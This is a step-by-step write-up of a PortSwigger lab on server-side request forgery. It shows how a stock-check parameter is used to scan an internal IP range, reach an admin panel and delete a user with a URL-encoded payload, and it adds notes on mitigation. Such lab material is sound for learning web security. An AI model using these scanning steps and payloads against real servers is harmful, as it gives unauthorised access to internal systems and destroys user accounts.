# Basic SSRF against another back-end system

**Source:** [PortSwigger](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)  
**Category:** SSRF  
**Difficulty:** Apprentice

## Objective
To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos.

## Vulnerability
This lab has a stock check feature which fetches data from an internal system.

## Exploitation

### Steps
1. Access the lab, intercept the stock check request. The request contains:
    ```text
    stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```

2. Send it to Intruder and run a Sniper attack on the IP `192.168.0.§1§` in the range from 1 to 255.
    -`1` returns status 200
    -`147` returns status 404
    -the rest returns status 500

    `147` is our lead, because it indicates that the host exists but does not respond, meaning there is no such path.

3. Send the request to Repeater. Try sending the request without the product value, i.e. just
    ```text 
    http://192.168.0.1:8080/
    ```
    more precisely:
    ```text
    stockApi=http%3A%2F%2F192.168.0.147%3A8080%2F
    ```
    we still get 404.

4. Try adding `/admin` to the request, i.e.:
    ```
    stockApi=http%3A%2F%2F192.168.0.147%3A8080%2Fadmin
    ```
    We get status 200 and see buttons for deleting users. The request for deleting `carlos` has the URL `/http://192.168.0.147:8080/admin/delete?username=carlos`.

5. Send the request to delete `carlos`:
    ```text
    http://192.168.0.147:8080/admin/delete?username=carlos
    ```
    i.e. after encoding:
    ```text
    stockApi=http%3A%2F%2F192.168.0.147%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
    ```
    The response is 302 found, lab solved.

### Payload
```text
stockApi=http%3A%2F%2F192.168.0.147%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```

### Shortcut
1. Intercept the stock check request.
2. Sniper attack `192.168.0.§1§` (1–255); `147` returns 404.
3. In Repeater, request `http://192.168.0.147:8080/admin`.
4. Request `http://192.168.0.147:8080/admin/delete?username=carlos`.
5. Lab solved.

## Impact
An attacker can make server-side requests to internal hosts via the `stockApi` parameter. This exposes internal admin panels and allows privileged actions such as deleting users.

## Mitigation
Do not let user input control the full target URL. Use a strict allowlist of hosts, paths, and protocols. Block internal IP ranges and localhost. Validate and sanitize `stockApi`.

## Tools
- Burp Suite
- Repeater
- Intruder

## Notes
- `stockApi` is vulnerable to SSRF.
- `147` returns 404, indicating an existing internal host.
- `/admin` on the internal host is accessible and exposes user deletion.
- Carlos is deleted via `GET /admin/delete?username=carlos`.